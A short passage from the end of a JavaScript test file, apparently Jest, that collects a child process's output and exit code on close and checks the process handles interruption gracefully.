        child.on('close', (code) => {
          resolve({ stdout, stderr, exitCode: code || 0 });
        });
      });

      // Should handle interruption gracefully
      expect(result.exitCode).toBeGreaterThanOrEqual(0);
    });
  });
});
